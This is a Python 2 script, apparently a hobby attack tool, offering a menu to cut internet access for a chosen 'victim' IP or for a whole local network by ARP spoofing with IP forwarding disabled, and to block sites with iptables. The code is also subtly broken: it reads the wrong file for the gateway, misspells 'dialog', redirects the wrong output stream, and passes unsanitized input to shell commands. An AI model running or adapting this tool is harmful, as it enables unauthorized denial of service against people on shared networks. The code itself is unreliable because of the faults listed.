#!/usr/bin/python2

import os
import time
import signal

def a() :

	def terminate(x,y) :
		
		os.system("dialog --infobox 'The blocking process has been terminated..!!' 10 40")
		time.sleep(1)
		os.system("pkill arpspoof")
		arp()
		signal.signal(2,terminate)


os.system("dialog --infobox  '          Welcome To Spoofing          ' 10 40")
time.sleep(1)

def arp():

	os.system("dialog --menu ' Select your choice ' 20 100 5 1 'Block internet access of  on the someone specific on the network' 2 'Block internet access of everyone on the network' 3 'Block any website' 4 'To unblock a website' 5 'Exit' 2> /root/Desktop/ch.txt")
	f=open('/root/Desktop/ch.txt' , 'r')
	c=f.read()
	if c== '1':
		os.system("dialog --inputbox 'Enter the IP address of the victim' 10 40 2> /root/Desktop/ipv.txt")
		f=open('/root/Desktop/ipv.txt' , 'r') 
		r=f.read()
		os.system("route -n | grep 'UG' | awk '{print $2}' 2> /root/Desktop/g.txt")	
		p=open('/root/Desktop/g.txt' , 'r') 
		q=f.read()
		os.system("cat /proc/sys/net/ipv4/ip_forward | echo 0 >/proc/sys/net/ipv4/ip_forward")
		os.system("dialog --infobox 'Internet access of the user has been blocked' 10 40")
		time.sleep(1)
		os.system("dialog --infobox 'Press Ctrl+C to exit' 10 30")
		time.sleep(1)
		os.system("arpspoof -i eth0 -t "+r+q+" 2> /dev/null")
		
	
	if c== '2' :
		os.system("route -n | grep 'UG' | awk '{print $2}' 2> /root/Desktop/g.txt")	
		p=open('/root/Desktop/g.txt' , 'r')
		q=f.read()
		os.system("cat /proc/sys/net/ipv4/ip_forward | echo 0 >/proc/sys/net/ipv4/ip_forward")
		os.system("dialog --infobox 'Internet access of the user has been blocked' 10 40")
		os.system("doalog --infobox 'Press Ctrl+C to exit' 10 40")
		time.sleep(1)
		os.system("arpspoof -i eth0  "+q+" 2> /dev/null")
		 

	if c== '3' :
		os.system("dialog --inputbox 'Enter the name of the website to be blocked' 10 40 2> /root/Desktop/name.txt")
		f=open('/root/Desktop/name.txt' , 'r')
		r=f.read()
		os.system("dialog --infobox 'The website has been blocked...!!!' 10 40") 
		os.system("doalog --infobox 'Press Ctrl+C to exit' 20 30")	
		os.system("iptables -I OUTPUT -p tcp --dport 443 -d "+r+" -j REJECT")
		os.system("iptables -I OUTPUT -p tcp --dport 80 -d "+r+" -j REJECT")
		

	if c== '4' :
		os.system("dialog --infobox 'The webite has been unblocked...!!!!' 10 40")
		os.system("doalog --infobox 'Press Ctrl+C to exit' 10 40")
		os.system("iptables -F")
		

	if c== '5' :
		exit()



a()

arp()


		
		



 
 



































































































































































































































































































































































































































































































































































































































































































































































  
